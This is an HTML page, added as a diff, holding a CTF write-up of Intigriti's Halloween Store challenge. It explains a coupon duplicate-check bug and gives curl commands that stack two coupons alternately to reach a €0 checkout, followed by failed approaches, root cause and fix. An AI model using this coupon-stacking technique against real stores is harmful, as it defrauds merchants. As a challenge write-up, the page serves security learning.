@@ -1,0 +1,154 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Intigriti Challenge 1026 — Halloween Store</title>
+<meta name="description" content="Coupon stacking in a fake candy store: how a duplicate-check bug turned a €666 item into a €0 order.">
+<style>
+  :root{
+    --bg:#fbfaf8; --fg:#1a1a1a; --muted:#666; --line:#e2ded8;
+    --code-bg:#171a1f; --code-fg:#e8e6e3; --accent:#a33b1f; --panel:#f3f1ed;
+  }
+  @media (prefers-color-scheme: dark){
+    :root{
+      --bg:#111315; --fg:#e9e7e3; --muted:#9a9791; --line:#2a2d31;
+      --code-bg:#0a0b0d; --code-fg:#e8e6e3; --accent:#e2703f; --panel:#191c1f;
+    }
+  }
+  *{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    margin:0; background:var(--bg); color:var(--fg);
+    font:16px/1.65 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  }
+  main{max-width:760px; margin:0 auto; padding:56px 20px 96px}
+  header{border-bottom:1px solid var(--line); padding-bottom:24px; margin-bottom:36px}
+  .kicker{font-size:12px; letter-spacing:.14em; text-transform:uppercase; color:var(--accent); font-weight:600}
+  h1{font-size:clamp(26px,4.4vw,36px); line-height:1.2; margin:.35em 0 .5em; letter-spacing:-.02em}
+  .meta{color:var(--muted); font-size:14px; margin:0}
+  .meta code{background:var(--panel); padding:1px 5px; border-radius:4px}
+  h2{font-size:20px; margin:2.4em 0 .6em; letter-spacing:-.01em}
+  p{margin:0 0 1em}
+  a{color:var(--accent)}
+  code{font:13.5px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+  pre{
+    background:var(--code-bg); color:var(--code-fg); padding:16px 18px; border-radius:8px;
+    overflow-x:auto; margin:0 0 1.4em; font-size:13.5px; line-height:1.55;
+  }
+  pre code{color:inherit; font-size:inherit}
+  p code, li code{background:var(--panel); padding:1px 5px; border-radius:4px}
+  ul{margin:0 0 1.2em; padding-left:22px}
+  li{margin:.35em 0}
+  table{width:100%; border-collapse:collapse; margin:0 0 1.4em; font-size:14.5px}
+  th,td{text-align:left; padding:9px 12px; border-bottom:1px solid var(--line); vertical-align:top}
+  th{font-weight:600; background:var(--panel)}
+  figure{margin:1.6em 0}
+  figure img{width:100%; height:auto; border:1px solid var(--line); border-radius:8px; display:block}
+  figcaption{color:var(--muted); font-size:13px; margin-top:8px}
+  .note{background:var(--panel); border-left:3px solid var(--accent); padding:12px 16px; margin:0 0 1.4em; border-radius:0 6px 6px 0}
+  footer{border-top:1px solid var(--line); margin-top:56px; padding-top:20px; color:var(--muted); font-size:13.5px}
+</style>
+</head>
+<body>
+<main>
+
+<header>
+  <div class="kicker">Intigriti — October 2026 Challenge #1026</div>
+  <h1>Halloween Store: stacking coupons the server forgot to check</h1>
+  <p class="meta">
+    Solved 20 Oct 2026 · Created by Globules · Flag: <code>INTIGRITI{redacted}</code>
+  </p>
+</header>
+
+<p>The store sells five cheap bags of candy (€8.90–€14.90) and one gift box, the Midnight Collection, for <strong>€666.00</strong>. Every session starts with <strong>€66.00</strong> of credit — ten times less than the vault.</p>
+
+<h2>The setup</h2>
+
+<p>Two coupons are advertised:</p>
+
+<table>
+  <thead><tr><th>Code</th><th>Discount</th><th>Requirement</th></tr></thead>
+  <tbody>
+    <tr><td><code>NIGHT20</code></td><td>20%</td><td>Cart must contain the Midnight Collection</td></tr>
+    <tr><td><code>NEWS30</code></td><td>30%</td><td>Newsletter signup + first order + cart must contain the Midnight Collection</td></tr>
+  </tbody>
+</table>
+
+<p>The cart is append-only — there is no remove endpoint, so whatever you add stays. Discount amounts are frozen at apply time as <code>percent × subtotal</code>, and the total is <code>subtotal − discount</code>.</p>
+
+<p>Making the vault affordable needs a discount of at least <strong>€600.00 (90.09%)</strong>. Both coupons together give exactly 50%, so the intended checkout is far out of reach. That gap is the puzzle.</p>
+
+<h2>The tell</h2>
+
+<p>In the store frontend there is a line that never renders for normal users:</p>
+
+<pre><code>promotion.percent + "% off" + (promotion.count &gt; 1 ? ` × ${promotion.count}` : "")</code></pre>
+
+<p>The UI knows how to display a coupon that has been applied more than once. Nothing a user can click produces <code>count &gt; 1</code>, so the server must have a path that does.</p>
+
+<h2>Testing the coupon endpoint</h2>
+
+<p><code>POST /api/cart/coupon</code> takes <code>{"code": "…"}</code> and returns the full cart. Re-sending the same code returns <code>409 coupon_already_applied</code>. That check looked solid until I tried it in a different order:</p>
+
+<pre><code>apply NIGHT20  -&gt; 200, NIGHT20 count 1
+apply NIGHT20  -&gt; 409 coupon_already_applied   (correctly rejected)
+apply NEWS30   -&gt; 200, NEWS30 count 1
+apply NIGHT20  -&gt; 200, NIGHT20 count 2         (not rejected)
+apply NEWS30   -&gt; 200, NEWS30 count 2</code></pre>
+
+<p>The duplicate check only compares the submitted code with the <strong>most recently applied promotion</strong>, not with the whole promotions list. Applying a different code in between clears the way to apply the first one again.</p>
+
+<p>Discounts are additive, so two stacks of each coupon give 20+20+30+30 = <strong>100%</strong>.</p>
+
+<h2>Exploit</h2>
+
+<pre><code>B=https://challenge-1026.challenges.intigriti.io
+
+curl -c jar -b jar $B/api/session
+curl -c jar -b jar $B/api/newsletter -H 'Content-Type: application/json' -d '{"email":"x@example.com"}'
+curl -c jar -b jar $B/api/cart/items  -H 'Content-Type: application/json' -d '{"productId":"midnight-vault"}'
+
+curl -c jar -b jar $B/api/cart/coupon -H 'Content-Type: application/json' -d '{"code":"NIGHT20"}'
+curl -c jar -b jar $B/api/cart/coupon -H 'Content-Type: application/json' -d '{"code":"NEWS30"}'
+curl -c jar -b jar $B/api/cart/coupon -H 'Content-Type: application/json' -d '{"code":"NIGHT20"}'
+curl -c jar -b jar $B/api/cart/coupon -H 'Content-Type: application/json' -d '{"code":"NEWS30"}'
+
+curl -c jar -b jar $B/api/checkout -H 'Content-Type: application/json' -d '{}'</code></pre>
+
+<p>Cart before checkout:</p>
+
+<pre><code>subtotal 66600  discount 66600  total 0
+promotions: NIGHT20 ×2 (20%), NEWS30 ×2 (30%)</code></pre>
+
+<p>Checkout returns <code>200</code> with <code>paid: 0</code> and the flag in the receipt.</p>
+
+<figure>
+  <img src="checkout-redacted.png" alt="Checkout receipt showing two stacked promotions and a paid total of zero; the flag is redacted." loading="lazy">
+  <figcaption>Checkout with both promotions stacked — total €0.00, order paid. Flag redacted.</figcaption>
+</figure>
+
+<h2>What did not work, and why</h2>
+
+<ul>
+  <li><strong>Unicode, case, and whitespace variants</strong> of the codes were all normalised to the same canonical code before lookup and dedupe (<code>NIGHT20\n</code>, <code>night20</code>, NBSP, tabs → same result), so there was no normalisation bypass.</li>
+  <li><strong>Concurrent applies</strong> (48 parallel requests, and apply-vs-remove races) came out strictly sequential — the promotions list never gained a duplicate from racing.</li>
+  <li><strong>Body overposting</strong> (<code>percent</code>, <code>amount</code>, <code>count</code> fields) was ignored; only <code>code</code> is read.</li>
+  <li><strong>Slow-body races</strong> against checkout were pointless: the proxy buffers the request body, so the cart snapshot always includes everything added before the body was complete.</li>
+</ul>
+
+<h2>Root cause and fix</h2>
+
+<p>The promotion list holds one entry per code with a <code>count</code>, and the duplicate check reads only the last element. The fix: check the submitted code against <strong>every</strong> promotion in the cart, enforce <code>count == 1</code> per code server-side, cap the total discount at the subtotal, and re-validate coupon eligibility at checkout.</p>
+
+<h2>Impact</h2>
+
+<p>A shopper can apply the same promotional code any number of times by alternating codes, bypassing the one-use-per-promotion rule. Here it turned a €666.00 item into a €0.00 order with €66.00 of store credit. In a real storefront the same bug is unbounded discount abuse, not just a challenge shortcut.</p>
+
+<footer>
+  Write-up by Assem Merzoug · <a href="https://github.com/ASSEMMERZOUG/ctf-writeups">ctf-writeups</a>
+</footer>
+
+</main>
+</body>
+</html>
